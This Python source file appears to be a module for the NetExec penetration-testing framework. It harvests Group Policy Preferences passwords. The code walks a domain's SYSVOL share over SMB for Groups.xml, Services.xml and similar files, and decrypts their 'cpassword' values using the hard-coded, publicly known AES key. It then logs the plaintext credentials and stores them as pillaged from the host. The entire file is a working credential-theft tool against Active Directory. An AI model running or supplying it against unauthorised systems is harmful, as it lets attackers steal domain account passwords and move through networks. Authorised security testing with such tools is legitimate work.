import xml.etree.ElementTree as ET
from Cryptodome.Cipher import AES
from base64 import b64decode
from binascii import unhexlify
from io import BytesIO


class NXCModule:
    """
    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
    Module by @byt3bl33d3r
    """

    name = "gpp_password"
    description = "Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences."
    supported_protocols = ["smb"]

    def options(self, context, module_options):
        """ """

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if share["name"] == "SYSVOL" and "READ" in share["access"]:
                context.log.success("Found SYSVOL share")
                context.log.display("Searching for potential XML files containing passwords")

                paths = connection.spider(
                    "SYSVOL",
                    pattern=[
                        "Groups.xml",
                        "Services.xml",
                        "Scheduledtasks.xml",
                        "DataSources.xml",
                        "Printers.xml",
                        "Drives.xml",
                    ],
                )

                for path in paths:
                    context.log.display(f"Found {path}")

                    buf = BytesIO()
                    connection.conn.getFile("SYSVOL", path, buf.write)
                    xml = ET.fromstring(buf.getvalue())
                    sections = []

                    if "Groups.xml" in path:
                        sections.append("./User/Properties")

                    elif "Services.xml" in path:
                        sections.append("./NTService/Properties")

                    elif "ScheduledTasks.xml" in path:
                        sections.extend(("./Task/Properties", "./ImmediateTask/Properties", "./ImmediateTaskV2/Properties", "./TaskV2/Properties"))

                    elif "DataSources.xml" in path:
                        sections.append("./DataSource/Properties")

                    elif "Printers.xml" in path:
                        sections.append("./SharedPrinter/Properties")

                    elif "Drives.xml" in path:
                        sections.append("./Drive/Properties")

                    for section in sections:
                        xml_section = xml.findall(section)
                        for attr in xml_section:
                            props = attr.attrib

                            if "cpassword" in props:
                                for user_tag in [
                                    "userName",
                                    "accountName",
                                    "runAs",
                                    "username",
                                ]:
                                    if user_tag in props:
                                        username = props[user_tag]

                                password = self.decrypt_cpassword(props["cpassword"])

                                context.log.success(f"Found credentials in {path}")
                                context.log.highlight(f"Password: {password}")
                                for k, v in props.items():
                                    if k != "cpassword":
                                        context.log.highlight(f"{k}: {v}")

                                hostid = context.db.get_hosts(connection.host)[0][0]
                                context.db.add_credential(
                                    "plaintext",
                                    "",
                                    username,
                                    password,
                                    pillaged_from=hostid,
                                )

    def decrypt_cpassword(self, cpassword):
        # Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385

        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
        key = unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
        password = b64decode(cpassword)
        IV = "\x00" * 16
        decypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
        return decypted.decode().rstrip()
